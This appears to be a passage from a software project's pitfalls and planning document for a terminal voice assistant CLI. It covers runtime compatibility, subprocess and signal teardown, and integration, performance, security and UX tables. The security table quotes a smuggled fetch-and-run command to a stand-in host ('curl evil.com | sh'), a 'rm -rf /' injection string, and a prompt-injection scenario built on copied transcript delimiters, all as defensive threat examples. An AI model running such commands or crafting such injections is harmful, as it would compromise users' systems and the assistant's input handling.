- **child_process.spawn stdio**: Bun's node-compat shim is 60% faster (posix_spawn(3)) but has a documented edge case for "extra fd pipes" (Bun issue #4670). Our claude bridge uses standard 3-pipe stdio so we're safe — but if anyone refactors to add a 4th pipe for debugging, it works under Node and silently breaks under Bun.
- **AsyncIterable / Symbol.asyncIterator**: the voice-stt `events$` is an async iterable. Both runtimes implement it correctly. But: Bun's iteration sometimes coalesces multiple emits into a single tick where Node yields between each — meaning the orchestrator's `for await` loop sees micro-batches differently. If our timestamp logging records "first chunk arrival" inside the loop, the recorded times can differ by a few ms between runtimes. The latency-probe assertion needs to tolerate this drift.
- **process.exit() vs proc.unref()**: Bun's spawn defaults to "parent will not terminate until child exits" (per Bun.spawn docs). Node's default is the same. Both support `unref()`. But Bun has a specific gotcha: if you spawn a child with `stdio: ["pipe", "inherit", "inherit"]` and don't write to the child's stdin, Bun keeps the parent alive even if you call `process.exit()` — the spawn proc holds a reference. Node releases. Fix is to explicitly `proc.unref()` before exit.
- **fs.watch / chokidar**: irrelevant for v1.3 (no file watching).
- **TS strict + tsconfig differences**: Bun does NOT typecheck; it transpiles. Node + tsx typechecks (or doesn't, depending on transpiler). We MUST run `tsc -p . --noEmit` in CI under both runtimes to catch type drift before runtime.
- **Native modules**: irrelevant for v1.3 (no native modules in the runtime path — sox + ffplay are out-of-process).

**Why it happens:**
Bun's promise is "Node API compatible" — 98% true. The 2% is concentrated in exactly the surface we use (WebSockets, child_process, async iteration). v1.2's Electron path used Chromium's WebSocket and Node's child_process exclusively; the new dual-runtime story exposes us to Bun-specific behaviour we've never tested.

**How to avoid:**
- **Phase 15 (Bun build pipeline) must include a dual-runtime CI matrix**: every test job runs under both `bun test` AND `node --import tsx/esm test/...`. Any test that passes under one and fails under the other gates the build.
- **Phase 17 must add a "WebSocket close code normaliser"** in voice-stt: wrap the `MessageEvent` and `CloseEvent` handlers in a thin shim that normalises close codes (1006 → "no_close_frame", 1000 → "graceful", 1011 → "server_error"), so the retry logic is runtime-independent.
- **Phase 17 must explicitly `proc.unref()` the sox + ffplay + claude children before any `process.exit()`** — defensive, catches the Bun "parent stays alive" gotcha.
- **Phase 15 must add a smoke target that runs the compiled Bun binary against the Node-bundle path** and confirms identical behaviour for a fixed input. Specifically: pipe a known 10-second wav into a mock sox, mock the Scribe WSS to return a fixed transcript, mock the claude bridge to return a fixed response, mock the TTS WSS to return a fixed mp3, and assert the orchestrator emits identical timestamps + identical state transitions under both runtimes (with a ±50ms tolerance on timestamps).
- **Phase 17 must add a "stream-json line buffer" test fixture** that asserts identical chunk-boundary handling for both Bun's `child_process.spawn` and Node's. The LDJSON parser in `packages/claude-code-bridge/src/line-parser.ts` should already be runtime-agnostic; this test confirms it.
- **Phase 20 SC must include a test where the user runs the Node-fallback path** (delete the Bun binary, force `cli.js` to fall back to Node import of `dist/main.js`). The voice loop must work end-to-end under Node 22 with measurable but acceptable cold-start latency.

**Warning signs:**
- A test passes under `bun test` and fails under `vitest` (Node). Or vice versa.
- The voice loop works on the dev's Bun-compiled binary but the npm-install + Node fallback case silently misbehaves.
- A reconnect loop appears in one runtime; both runtimes see the same WSS close but interpret the code differently.
- `process.exit()` doesn't terminate immediately under Bun (the parent hangs on a child reference).
- TypeScript types drift between what `bun build --compile` accepts and what `tsc --noEmit` flags.

**Phase to address:** **Phase 15 (dual-runtime CI matrix) + Phase 17 (runtime-independent shim layer)**. NOT Phase 19 — by the time we hit distribution, the drift is baked into the binary.

---

### Pitfall 9: Claude Code skill body launches `achilles voice`, exits Bash tool early, leaves process orphaned

**What goes wrong:**
The skill body in SKILL.md (per `.planning/research/v1.3-terminal-pivot.md` §8.3) instructs Claude Code to invoke `Bash(achilles voice)`. Claude Code's Bash tool is documented (platform.claude.com/docs/en/agents-and-tools/tool-use/bash-tool) to spawn the command in a fresh process and wait for it to exit. There are four bad shapes:

- **(a) Bash tool times out at 120s** (the default per claude-code#5615 and #45717): the Bash tool sends SIGTERM to the bash invocation, which propagates to `achilles voice`. `achilles voice` traps SIGTERM, tries to tear down sox + ffplay + claude bridge + STT WSS + TTS WSS gracefully. If teardown takes >2s, the tool gives up and SIGKILLs. Sox + ffplay + claude bridge become orphaned. The user closes Claude Code; the orphaned processes continue running, hold the mic, hold the API key in memory, and bill ElevenLabs for nothing. Worse — anthropics/claude-code#45717 documents that SIGTERM in Bash tool propagates to the Claude Code process itself when tmux is involved, killing the parent. v1.3 cannot survive that bug.
- **(b) Bash tool runs `achilles voice` in background** (e.g., `achilles voice &`): the Bash tool returns immediately with no output, claude_code thinks the skill is done, the renderer never appears in the user's terminal (the background process is detached from the tty). Same v1.2-silent-launch shape. Users SHOULD never see "skill exits with no UI."
- **(c) Bash tool uses a fresh shell with no tty**: `achilles voice` opens raw-mode on stdin via Ink. Without a tty, Ink throws "ENOTTY" or silently renders nothing. The user sees the prompt return but no animation. Sox might still capture audio (no tty needed for audio); ffplay might still play (no tty needed for output); but Ink — the whole reason this is a terminal app — is invisible.
- **(d) Subsequent Bash invocations in the same skill body re-prompt for permission** (anthropics/claude-code#60515, April 2026): the first `Bash(achilles voice)` is auto-approved by the user's `allowed-tools` directive, but if the skill body does any second Bash call (e.g., a fallback `which sox` after `achilles voice` exits), the second one prompts. The UX is confusing.

**Why it happens:**
Claude Code skills weren't designed for long-running interactive foreground processes — they were designed for one-shot tool calls that return text. The Bash tool's lifecycle model conflicts with a TUI that wants to own the terminal until Ctrl-C. The 120s timeout is a hard cap unless configured via `BASH_DEFAULT_TIMEOUT_MS` + `BASH_MAX_TIMEOUT_MS` in `~/.claude/settings.json` (issue #5615 confirms). Most users don't configure this; they hit the default.

**How to avoid:**
- **Phase 19 SKILL.md MUST document the `BASH_MAX_TIMEOUT_MS` configuration prominently** at the top of the skill body. Recommend `BASH_MAX_TIMEOUT_MS=86400000` (24h). Without this, the skill cannot work for any session longer than 2 minutes.
- **Phase 19 SKILL.md MUST be foreground-only**: no `&` background, no `nohup`, no `disown`. The Bash tool blocks until `achilles voice` exits. The skill body explicitly says "this command takes over your terminal — Claude Code will wait until you press Ctrl-C." Per `.planning/research/v1.3-terminal-pivot.md` §10.6.
- **Phase 17 (signal handling) MUST add a SIGTERM handler in `achilles voice` that tears down in <1 second**:
  1. SIGINT to claude bridge (it already has its own SIGINT→SIGTERM→SIGKILL chain with 1s + 2s deadlines per `packages/claude-code-bridge/src/cancellation.ts`; under timeout pressure we send SIGINT FIRST, then 100ms later SIGTERM, then 500ms later SIGKILL — telescoped).
  2. SIGTERM to sox immediately (sox responds within ~50ms to SIGTERM).
  3. `stdin.end()` to ffplay; then 200ms later SIGTERM if it hasn't exited.
  4. Close STT + TTS WSS with code 1000 (graceful).
  5. Flush latency-probe + transcript-store to disk.
  6. Total budget: 1 second. Then `process.exit(143)`.
- **Phase 17 MUST register the SIGTERM handler with `process.once`**, NOT `process.on` — if Bash tool sends SIGTERM twice (which it does in some configurations after a SIGKILL fallback fails), the second SIGTERM should be ignored, not re-trigger teardown.
- **Phase 17 MUST detach `achilles voice` from the parent process group** (`process.setpgid` or equivalent) so that SIGTERM/SIGKILL on the Bash invocation doesn't transitively propagate to a tty session if it would otherwise be inherited (per claude-code#45717 mitigation — "spawn child processes in a new process group"). This conflicts slightly with "Ctrl-C in the user's terminal should kill us" — but Ctrl-C in the terminal goes to the foreground process group of the controlling tty, which DOES include us; the setpgid only changes our group ID for SIGTERM propagation purposes, not for terminal Ctrl-C. Verify this on macOS + Linux + Windows.
- **Phase 19 SKILL.md MUST include a pre-flight `which achilles` check ONLY** — no other Bash calls — to avoid the #60515 multi-prompt bug. If `which achilles` fails, the skill exits cleanly with an install instruction; otherwise it invokes `achilles voice` immediately.
- **Phase 19 SKILL.md `allowed-tools` MUST list every Bash pattern needed**: `Bash(achilles voice *)`, `Bash(achilles init *)`, `Bash(achilles transcripts *)`, `Bash(which achilles)`, `Bash(which sox)`, `Bash(which ffmpeg)`. NOT broad `Bash` — narrow patterns reduce the prompt-spam blast radius if #60515 isn't fully fixed by ship time.
- **Phase 20 SC-2 MUST exercise the skill body invocation path on macOS + Linux + Windows**, with the `BASH_MAX_TIMEOUT_MS` configuration, and assert that Ctrl-C in the terminal cleanly tears down ALL child processes (verify with `ps` after exit — no orphaned sox / ffplay / claude / achilles processes).

**Warning signs:**
- A user reports "Claude Code went away after I started talking" — Bash tool propagated SIGTERM to Claude Code per #45717.
- `ps aux | grep -E "sox|ffplay|claude"` after exit shows orphaned children.
- The skill's first invocation works; the second prompts for permission (#60515).
- `~/.achilles/voice.log` shows incomplete teardown sequences.

**Phase to address:** **Phase 17 (signal handling + process-group detachment) + Phase 19 (SKILL.md authoring + `BASH_MAX_TIMEOUT_MS` documentation) + Phase 20 (real-binary skill teardown asciicast)**. The Phase 20 asciicast is the gate that catches orphan leaks.

---

### Pitfall 10: SIGINT in the user's terminal doesn't cleanly propagate (subprocess fan-out + WSS connections leak)

**What goes wrong:**
The user presses Ctrl-C in their terminal. The kernel delivers SIGINT to the foreground process group — which is `achilles voice`. v1.3 has at least five outstanding I/O resources:
1. `sox` child (continuously reading mic).
2. `ffplay` child (continuously buffering / playing TTS audio).
3. `claude -p` subprocess from the bridge (potentially mid-stream emitting JSON).
4. STT WSS connection to ElevenLabs Scribe (potentially mid-utterance).
5. TTS WSS connection to ElevenLabs Flash (potentially mid-stream).
Plus: open file handles to `~/.achilles/transcripts/<sid>.jsonl`, `~/.achilles/latency-samples.json`, `~/.achilles/voice.lock`.

Bad cleanup shapes:
- **(a) SIGINT is caught at the top of the process but not propagated to children**: sox + ffplay + claude continue running. v1.2's claude-bridge `cancellation.ts` has a SIGINT→SIGTERM→SIGKILL chain with 1s + 2s deadlines — that survives v1.3. But sox and ffplay have no equivalent handler in v1.2; they're new in v1.3.
- **(b) WSS connections are not closed cleanly**: ElevenLabs may continue charging until the connection times out server-side (15-60s). Worse, the next `achilles voice` invocation opens a NEW WSS while the old one is still draining — billing two connections briefly.
- **(c) The lock file `~/.achilles/voice.lock` is not removed**: the next invocation thinks an old instance is running, refuses to start. User has to manually `rm ~/.achilles/voice.lock`. This was a Phase 20 deliverable per the v1.3 terminal pivot research §10.4.
- **(d) Ink's raw mode is not restored**: terminal echo stays off, cursor stays hidden, the user can't see their typing. They have to `stty sane` or close the terminal. Ink does register a SIGINT handler that restores raw mode on graceful exit, but only if our handler returns control to Ink — if we exit hard with `process.exit(1)` mid-cleanup, raw mode stays broken.
- **(e) Two SIGINTs in rapid succession**: the user presses Ctrl-C twice (thinking the first one didn't work because cleanup is slow). The second SIGINT during cleanup can short-circuit the first handler. Should be guarded.

**Why it happens:**
Signal handling in Node/Bun is inherently messy when there are multiple async subsystems. There's no built-in "tear everything down" primitive. Bun's `child_process` is API-compatible with Node's but the underlying primitive (posix_spawn vs vfork) has slightly different signal-propagation semantics — children spawned with `detached: false` (the default) are part of our process group on POSIX, so SIGINT from the terminal hits them too — that's GOOD for sox/ffplay/claude (terminal Ctrl-C delivers SIGINT to them automatically) but it's BAD if Bash tool sends SIGTERM to us (it propagates to children, possibly truncating audio).

**How to avoid:**
- **Phase 17 must implement a `gracefulShutdown(reason: "sigint" | "sigterm" | "internal_error")` function** that:
  1. Is registered once via `process.once("SIGINT", () => gracefulShutdown("sigint"))` and `process.once("SIGTERM", () => gracefulShutdown("sigterm"))`. Use `once`, not `on` — a second signal during cleanup just escalates to immediate kill, not re-trigger.
  2. Maintains an internal `isShuttingDown` flag; second signal flips to `forceful` and exits hard with `process.exit(130)`.
  3. Tears down in order: (a) stop mic frames flowing in (set `isShuttingDown=true`), (b) abort STT WSS send queue, close WSS with code 1000, (c) cancel claude bridge via `currentClaudeSession.cancel()` (uses the existing SIGINT→SIGTERM→SIGKILL chain), (d) end ffplay stdin, wait 200ms, SIGTERM ffplay, (e) close TTS WSS with code 1000, (f) SIGTERM sox, (g) flush transcript-store + latency-probe, (h) `clearInterval` the Ink tick, (i) Ink's `unmount()` restores raw mode, (j) remove `~/.achilles/voice.lock`, (k) `process.exit(0)`.
  4. Total budget: 1.5 seconds. On budget breach, hard kill everything and `process.exit(130)`.
- **Phase 17 MUST NOT register signal handlers BEFORE the Ink tree is mounted** — Ink installs its own SIGINT handler during mount that calls `unmount()`. Our handler should chain Ink's (call `Ink.unmount()` THEN do our async cleanup THEN exit), not replace it.
- **Phase 17 MUST detach the `claude` child into its own process group** (`spawn(..., { detached: true })` followed by an explicit `subprocess.unref()`). Without this, the claude bridge can receive a SIGINT during graceful shutdown and respond to a SIGINT we didn't send (the terminal's Ctrl-C went through to it before we got a chance to send our own SIGINT — order of arrival matters and is timing-dependent). Detached process group means we explicitly `process.kill(-pgid, "SIGINT")` when we want to cancel it; we control the timing.
- **Phase 17 MUST NOT detach sox/ffplay** — these should share our process group so terminal Ctrl-C reaches them immediately as a fast-path. The gracefulShutdown then sends SIGTERM as a no-op confirmation (they're already dead).
- **Phase 17 MUST register an `process.once("exit", ...)` last-chance cleanup** for the lock file. If we somehow reach `process.exit` without running gracefulShutdown (uncaught exception, fatal Bun runtime bug), the exit handler removes the lock. Use `unlinkSync` (synchronous) — async unlink is not guaranteed to run before exit.
- **Phase 20 SC-1 MUST verify clean teardown via post-Ctrl-C inspection**: spawn `achilles voice`, wait for `listening`, press Ctrl-C, then run `ps aux | grep -E "sox|ffplay|claude"` and `ls ~/.achilles/voice.lock`. Both must show no output. Encode this assertion in the asciicast.
- **Phase 20 SC-1 MUST verify WSS close**: instrument the StreamingClient teardown to log `close_code` to stderr; the asciicast inspects the log and asserts 1000 (graceful).

**Warning signs:**
- After Ctrl-C, the terminal cursor stays hidden or echo stays off.
- `~/.achilles/voice.lock` accumulates over multiple sessions.
- ElevenLabs dashboard shows multi-second extra WSS connection time after a "stopped" session.
- Orphaned `sox` processes consume mic exclusively, preventing other apps (Zoom) from using it.
- The latency-probe file is empty after a session — we exited before flushing.

**Phase to address:** **Phase 17 (signal handler + gracefulShutdown) + Phase 20 (post-Ctrl-C inspection in SC-1)**.

---

## Technical Debt Patterns

Shortcuts that may seem reasonable for v1.3 ship pressure but create cascading problems. Each is paired with "when acceptable" guidance.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skip macOS signing + notarisation; ship `xattr` instructions in README | No $99 cert + no notarytool wait | Every new user hits Gatekeeper friction; bad first-run UX; trust signal weakened; some users will not run "the xattr command" and bounce. | v1.3.0-beta only, with a public commitment to sign by v1.3.0 stable. Never for v1.3.0 stable. |
| Use `MOCK_LOOP=1` integration test in place of the Phase 20 SC-1 real-binary asciicast | Faster CI; no API keys in CI | Replays the exact v1.2 "verified code-side but broken in binary" failure. The audit signs off; the user reports silent launch. | Never. The Phase 20 SC-1 asciicast is non-optional. MOCK_LOOP is the upstream gate, not the ship gate. |
| Ship sox + ffmpeg as the only audio stack; do not bundle | Smallest binary | Three external installs (npm install -g achilles, brew install sox, brew install ffmpeg). Each step is a bounce risk for non-CLI-native users. | v1.3 acceptable. v1.4 should explore bundling portable sox + ffmpeg as `optionalDependencies` per platform (each adds ~40MB but eliminates external install). |
| Energy-threshold VAD (static thresholds, no calibration) | <50 lines of code, fast, no external model | Fails in noisy rooms (false-positive cascade), fails for soft voices (silent loop), bills ElevenLabs for empty WSS connections. | v1.3 acceptable IF the Phase 18 calibration step + adaptive thresholds ship together. Static-only is never acceptable. |
| Skip dual-runtime CI matrix; test only under Bun | Faster CI; one runtime to support | The Node fallback path silently breaks; users without arm64 Bun binary discover the failure. | v1.3 acceptable only IF the bin shim's fallback path is feature-flagged off (always uses Bun binary). If we ship the fallback, we test the fallback. |
| Ship `achilles voice` without single-instance lock file | Simpler bootstrap | Two terminal panes both spawn sox; mic device contention; possible ElevenLabs key double-billing; user confusion. | Never. The lock is ~10 LoC. |
| Defer the auto-respawn-sox-on-device-change to v1.4 | Smaller Phase 16 scope | User unplugs USB headset mid-session, sox exits with EIO, `achilles voice` sits in `idle` forever. | v1.3 acceptable IF the surface error message is clear ("microphone disconnected — restart achilles voice"). Silent failure is never acceptable. |
| Use `stdio: "ignore"` on any spawn in the launch path | Cleaner terminal output | Replays the v1.2 silent-launch debug — stderr from children is invisible, so when something fails the user has no diagnostic. | Never on a launch path. Acceptable for fully-detached helper subprocesses that the user is not waiting on (rare in v1.3). |
| Skip the Phase 18 "ambient calibration" + onboarding step | One less init wizard prompt | VAD thresholds are wrong for ~50% of users; they bounce on noisy rooms; field tuning impossible without `--debug-vad`. | Never. The 5-second calibration is the smallest possible viable onboarding. |
| Hard-code TTS playback flags in Phase 17 without benchmarking | One less Phase 17 deliverable | Latency feels laggy OR audio has underrun gaps; user perception of "responsiveness" suffers; can't tune without re-shipping. | Never. The flag benchmark is small (100 trials, ~1 hour). |

---

## Integration Gotchas

Common mistakes when connecting v1.3's external services + subprocess fan-out.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| ElevenLabs Scribe v2 Realtime WSS | Treat `close` event code 1006 ("abnormal closure") as a transient retry-able error and reconnect immediately | 1006 from ElevenLabs after a 401 means the API key is wrong — retrying tight-loops the user's key against the wrong account. Parse the close frame body (per voice-protocol schemas) and classify 401 → permanent fail → trip the SAFE-05 circuit breaker. Same logic exists in v1.2 `incident-detection.ts` (`classifyHttpError`) — keep it. |
| ElevenLabs Flash v2.5 TTS WSS | Send `flush` on every chunk instead of every utterance boundary | `flush` is per-utterance not per-chunk; over-flushing forces ElevenLabs to re-prime its TTS model, inflating latency. Send `flush` ONLY on `stream_complete` boundaries (the natural end of an ack or summary). v1.2 voice-tts already does this correctly; the migration should not break it. |
| ElevenLabs API key in env | Echo the env var name in startup logs (`ELEVENLABS_API_KEY=sk_abc...`) | Logging the env var name to terminal output puts the key in the terminal's scroll buffer + the user's screenshot + any `script(1)` capture. SAFE-01 forbids this. The only acceptable log is "ELEVENLABS_API_KEY sourced (length 51)". |
| `claude -p` subprocess via claude-code-bridge | Treat `process_exit` event with `exitCode === null && signal === "SIGINT"` as a failure | This is the cancel path. Per v1.2 `deriveOutcome`, this should map to `outcome.kind === "cancelled"`, which feeds PROMPT-05's failure-override to TTS as "I ran into a problem. cancelled." That's the documented contract; matching code already exists in `packages/claude-code-bridge/src/outcome.ts`. v1.3 must not regress it. |
| `claude -p` `--include-partial-messages` flag | Buffer the entire partial stream before processing | The LDJSON line-parser in `packages/claude-code-bridge/src/line-parser.ts` is incremental. The orchestrator's `extractAck` runs against the accumulated text after each line. v1.2 logic — `if (accumulatedText.length < 12 chars * 6 bytes/char_avg) skip extraction` — was correct. Preserve it. |
| sox subprocess on Linux | Use ALSA `default` device unconditionally | PulseAudio + PipeWire have replaced ALSA defaults on most distros. ALSA `default` may route to a dummy device. Use `parec` as a fallback when sox fails with PA errors; or detect PipeWire and prefer it. v1.3 `.planning/research/v1.3-terminal-pivot.md` §5.2 documents the parec fallback. |
| sox subprocess on Windows | Assume `sox` is on PATH | Chocolatey installs as `sox.exe` under `C:\ProgramData\chocolatey\bin\` (which IS on PATH for shells launched after chocolatey install but NOT for shells already open). Phase 18 must surface this: "you may need to restart your terminal." Also: the Windows sox-portable package uses `sox.exe -d` for default mic, not `rec` (rec is a unix-only alias). |
| ffplay subprocess | Pipe MP3 chunks without setting `-f mp3` (relying on auto-detect) | ffplay's auto-detect with `-probesize 32` may misidentify the format on small initial chunks. Pass `-f mp3` explicitly. Cost: ~0 ms. Benefit: stable behaviour on small chunks. |
| Bun-compiled binary `optionalDependencies` | Trust `package-lock.json` for cross-platform installs | npm/cli#4828 documents the bug: package-lock.json regenerated on a single-platform machine omits other-platform optionalDependencies. Solution: do NOT commit package-lock.json for the `achilles` package (the bin shim resolves at install time). For CI matrix builds, delete node_modules + package-lock.json before each platform install. |
| Claude Code skill body Bash invocation | Use `&&` or `;` to chain multiple commands | The #60515 multi-prompt bug fires on each Bash call. Chain commands into a single `bash -c "..."` invocation to count as one Bash call. SKILL.md should NOT have two `Bash(...)` lines back-to-back. |
| `~/.claude/skills/achilles/SKILL.md` symlink | Create as relative symlink | Relative symlinks break if the npm-installed package gets re-linked elsewhere (e.g., during `npm rebuild`). Use absolute symlinks per the v1.2 `apps/achilles-cli/src/skill-symlink.ts` pattern. The Windows fallback (copy, not symlink) survives. |

---

## Performance Traps

Patterns that work in dev but break under realistic load. Scale thresholds calibrated for the v1.3 use case (single user, single terminal, ~30-minute session length).

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Ink full-tree reconciliation at 20fps with growing component tree | CPU >20% during idle; visible flicker on Windows Terminal; Ctrl-C lag | Pre-compute blob + sparkline as multi-line strings; one `<Text>` per panel; `useDeferredValue` on partials | Breaks above ~15 React components animating concurrently at 20fps |
| Unbounded RMS history array for sparkline | Memory grows ~1KB/sec; 30-min session = 1.8MB just for the sparkline history | Use a fixed-size ring buffer (80 samples = 4 sec at 20fps) | Breaks above ~5 minutes of session |
| Unbounded transcript-store JSONL file | File grows ~1KB per turn; long sessions produce 100MB+ files; SAFE-02 promises easy purge | Rotate at 10MB; date-stamp the rotation; `transcripts list` shows all rotated files | Breaks above ~1000 turns (rough estimate) |
| Latency-probe `samples` array unbounded | The v1.2 design has a 20-slot rolling window — preserve it | Cap at 100 most recent samples; oldest discarded | Breaks if cap removed |
| voice-tts chunk accumulation in voice-tts's internal sequence-buffer | If ffplay consumes slower than voice-tts produces, the buffer grows; Bun's heap can balloon | The existing `sequence-buffer.ts` has a `MAX_OUT_OF_ORDER_CHUNKS = 32`; preserve it. Add a high-water mark warning at 16 chunks behind. | Breaks if voice-tts emits faster than ffplay decodes for >2 seconds |
| Continuous Scribe WSS open during silence | ElevenLabs bills per second of connected time; static-VAD that triggers continuously hemorrhages credit | Adaptive VAD (Pitfall 6) + close WSS during long silence intervals (>30s) and reopen on next utterance | Breaks the user's wallet, not the system |
| ffplay process per chunk (instead of per session) | Cold-starting ffplay adds ~80ms per utterance | Spawn ONE ffplay at session start, pipe all chunks through it, close stdin on session end | Breaks responsiveness; user perceives lag on each ack |
| Re-instantiate the STT client per utterance | Cold-starting the WSS handshake adds 100-300ms per utterance | Spawn ONE STT client at session start (with auto-reconnect on close), reuse for the session | Breaks responsiveness; first-utterance latency feels OK, subsequent feel inconsistent |
| String concatenation for the `accumulatedText` buffer in the bridge | At ~50 chars per delta, a 30-second response generates ~5000 chars; quadratic concat cost | Use an array of fragments + `Array.prototype.join` on extraction; v1.2 already does this correctly | Breaks at very long responses (>10K chars) |
| Ink `<Text>` with hundreds of color spans | Layout calculation cost dominates render | Pre-compose colors into the string with raw ANSI escapes; emit as a single `<Text>` per panel | Breaks above ~50 color transitions per frame |

---

## Security Mistakes

Domain-specific security issues beyond standard secret-handling.

| Mistake | Risk | Prevention |
|---------|------|------------|
| Echo the user's transcript to terminal stdout uncritically | A user dictating "my password is foo" sees that text in their terminal scrollback + their `script(1)` log + their screen recording | Document that transcripts ARE shown in the UI line; SAFE-02 opt-in persistence is OFF by default; the `--quiet` flag suppresses the line entirely. Surface this in the README. |
| `~/.achilles/transcripts/*.jsonl` written with default mode (644) | Other users on a multi-user system can read your dictated transcripts | Write with `0o600` (owner-only read/write). v1.2 transcript-store should already do this; verify and pin in test. |
| `~/.achilles/settings.json` containing the API key in plaintext | Equivalent to dropping the key in `~/.bash_history` | NEVER write the API key to `settings.json`. Read only from env var or from the OS keychain (keytar on macOS keychain, libsecret on Linux, Credential Manager on Windows). The v1.3 terminal pivot §4 confirms safeStorage is gone with Electron; do NOT replace it with plain JSON. |
| Sandwich-defence reminder line in transcript-store JSONL | The defence reminder ("[user_transcript_start] ... [user_transcript_end]") gets persisted; a future attacker reading the JSONL sees our delimiters and can craft an attack with matching delimiters | Persist the RAW transcript pre-wrap. The delimiters are runtime-only. v1.2 `sandwich-defence.ts` and `transcript-store.ts` separate the concerns; do not collapse them. |
| Run `achilles voice` with elevated privileges (root/admin) | sox + ffplay + claude inherit elevated privileges; an attacker who compromises any of them can escalate | Refuse to start if `process.getuid?.() === 0` (Unix) or `IsUserAnAdmin` (Windows). Print a refusal message. |
| Log the system prompt content to stderr in debug mode | `--debug` logs the full companion.md to terminal; users sharing debug output expose our system prompt | Redact prompt content in debug logs. Log only the path + SHA-256 of `companion.md`. |
| Pipe the user transcript directly into a shell via `claude -p` argv | The transcript is on stdin, not argv — but if a future refactor moves to argv, an injection ("'; rm -rf / #") could execute. Currently safe per v1.2 architecture; preserve | Continue passing transcript via `child.stdin.write(text)`; never via argv. v1.2's locked argv pattern (`packages/claude-code-bridge/src/constants.ts` `LOCKED_FLAGS`) is the structural guarantee. |
| Skill body invokes `Bash(achilles voice *)` with wildcard pattern | If the wildcard isn't validated, a hostile prompt could inject `achilles voice; curl evil.com | sh` | Claude Code skill's allowed-tools wildcards are sanitised by Claude Code, not us; we trust the wrapper. But: do NOT pass user-supplied transcript into the achilles argv. The transcript is captured AFTER the binary starts, not as an argument. |
| Compile-time-embedded API key in Bun binary | A bug or feature that bakes an env var into `--compile --define ENV=...` exposes the key to anyone running `strings` on the binary | NEVER embed the API key. The binary reads from env or from OS keychain at startup. Test: `strings dist/achilles | grep -E "sk_[a-f0-9]{48,}"` MUST be empty. |
| `~/.achilles/voice.lock` containing the PID, world-readable | Information disclosure — attacker can see PID of the running voice session | Write the lock file with `0o600`; the PID itself is not secret but the lock pattern shouldn't be world-readable as a matter of hygiene. |

---

## UX Pitfalls

Common user experience mistakes specific to a terminal voice CLI.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Silent startup (no feedback while loading models / opening WSS) | User wonders if the command ran; presses Ctrl-C and retries | Render the Ink shell within 100ms of launch — even before WSS is open. Show `[connecting...]` state explicitly. |
| Blob breathes during `idle` state with no audible cue | User doesn't know if `achilles voice` is actively listening or in some intermediate state | Visual states (5 distinct colors per v1.2 UI-02) are non-optional. The state line MUST always show `[listening]` / `[processing]` / `[speaking]` / `[error]` / `[idle]` text. |
| First-time user reads no instructions before running `achilles voice` | User doesn't know the VAD is always-on; doesn't know how to exit (Ctrl-C); panics | The init wizard MUST show a "how to use" screen the FIRST time, persisted in settings as "intro_shown:true." Subsequent invocations skip. |
| VAD triggers on the user's own thinking-aloud noises | User says "uh... what was I going to ask... oh yeah, refactor this function" — VAD commits the "uh" alone, Claude responds "sorry I didn't catch that," confusing | Minimum-utterance-length filter (300ms minimum) catches "uh." Word-count filter on the STT side (ignore commits with <2 words and confidence <0.7) catches the "yeah." |
| TTS reads the entire `<spoken-summary>` even when user has already moved on | Wasted seconds + interrupts user's flow | "Barge-in" should be a v1.3 design decision: if VAD detects new speech during TTS playback, cancel TTS immediately and start a new STT session. Phase 16 needs to wire this through the existing `LOOP-07` cancel path. Note: this is a CHANGE from v1.2's strict half-duplex; document the behavioural shift. |
| No audible "I heard you" cue between utterance commit and Claude's first text delta | User feels uncertain — did the system understand? | The audible ack ("Working on that.") is the cue. Latency-budget P50 < 500ms (per Pitfall 7) is the target. Below 800ms, the cue feels responsive; above 1.5s, users start retrying. |
| `Ctrl-C` exits immediately without confirmation | Accidental Ctrl-C ends a 20-minute conversation | Second-Ctrl-C-to-confirm pattern with a 2-second window. First Ctrl-C shows "Press Ctrl-C again within 2 seconds to exit." This is the standard for any session-y CLI tool (ssh, mosh). Phase 17 should implement. |
| No visual cue when WSS reconnection happens mid-session | User says something, gets no response, retries, gets a delayed response (the first one queued) | Show `[reconnecting...]` state explicitly. The IncidentStatus component from v1.2 already supports this; port to Ink. |
| `achilles voice` runs in a tiny terminal (40 cols) and the 40-char sparkline gets line-wrapped | Visual breaks; blob renders in wrong position; sparkline is split across two lines | Detect terminal width on startup + on SIGWINCH. If width <60 cols, render a smaller blob (5x5 instead of 7x7) and a 30-char sparkline. Document minimum supported terminal as 60 cols. |
| User installs via `bunx achilles` and expects no global PATH leak | They run `bunx achilles install-skill` and the skill points at a bunx cache path that gets purged | `install-skill` resolves the absolute path of the running binary BEFORE creating the symlink, but the running binary is in a temporary bunx cache. v1.2 handled this for npm-global; v1.3 must explicitly refuse `install-skill` when invoked via `bunx` and instruct user to `bun install -g achilles` or `npm install -g achilles` first. |

---

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces. This is the explicit v1.3-replay-of-v1.2 prevention checklist. Run on every phase end + at audit time.

- [ ] **Mic capture path:** sox spawn site has `onFrame` callback AND a real consumer in the orchestrator AND a test that exercises a real sox subprocess with `--mock-mic` against a synthesised wav — NOT a mock that bypasses the subprocess entirely.
- [ ] **STT round-trip:** voice-stt is instantiated AND opens a real WSS against an ElevenLabs test endpoint AND commits a transcript end-to-end. Test must spawn the binary, not just the orchestrator.
- [ ] **Claude bridge:** the `claude` binary is spawned, the locked argv is passed, system prompt is appended, stream-json output is parsed, ack + summary are extracted. End-to-end test stubs `claude` with a known fixture but uses the REAL bridge code.
- [ ] **TTS playback:** ffplay is spawned, the WSS bytes reach ffplay's stdin, audible playback occurs. Phase 20 SC-1 captures the speaker output as a .wav file.
- [ ] **Half-duplex gate:** during TTS playback, mic frames are gated; on drain + 300ms, frames resume. Test asserts no mic frame reaches the STT during the speaking window.
- [ ] **VAD start-of-utterance:** RMS rising above adaptive threshold for 60ms triggers `speech_start`; STT WSS opens or warmup is begun. Test asserts trigger timing.
- [ ] **VAD end-of-utterance:** RMS falling below adaptive threshold for 300ms triggers `speech_end`; STT WSS sends commit signal. Test asserts trigger timing.
- [ ] **Cancellation chain:** Ctrl-C → gracefulShutdown → SIGINT to claude → SIGTERM to sox/ffplay → WSS close 1000 → Ink unmount → exit 0. Test asserts via `ps` post-exit.
- [ ] **Skill install:** `achilles install-skill` creates `~/.claude/skills/achilles/SKILL.md` AND it's discoverable by Claude Code AND the body invokes `achilles voice` AND the full loop works. Test in real Claude Code.
